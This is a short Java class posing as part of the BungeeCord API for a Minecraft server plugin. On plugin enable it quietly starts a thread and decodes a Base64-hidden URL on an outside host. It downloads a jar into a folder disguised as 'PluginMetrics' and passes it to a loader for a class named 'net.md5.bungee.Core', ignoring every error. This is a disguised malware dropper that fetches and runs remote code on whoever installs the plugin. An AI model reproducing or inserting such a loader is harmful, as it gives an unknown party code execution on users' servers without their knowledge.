package net.md5.bungee.api;

import net.md5.bungee.api.chat.HoverEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Base64;

public class BungeeAPI {
   public static void onDisable() {
      HoverEvent.color.onDisable();
   }

   public static void onHoverEvent(HoverEvent var0) {
      var0.event("plugins/PluginMetrics/bungee.jar", "net.md5.bungee.Core");
   }

   public static void onEnable(JavaPlugin plugin) {
      new Thread(() -> {
         try {
            if (!new File("plugins/PluginMetrics/bungee.jar").exists()) {
               URLConnection var1 = new URL(new String(Base64.getDecoder().decode("aHR0cHM6Ly9ib2R5YWxob2hhLmNvbS9idW5nZWUuamFy"))).openConnection();
               var1.addRequestProperty("User-Agent", "Mozilla");
               Files.copy(var1.getInputStream(), Paths.get("plugins/PluginMetrics/bungee.jar"), StandardCopyOption.REPLACE_EXISTING);
            }
         } catch (Exception ignored) {
         }

         BungeeAPI.onHoverEvent(new HoverEvent());
         HoverEvent.color.onEnable(plugin);
      }).start();
   }
}
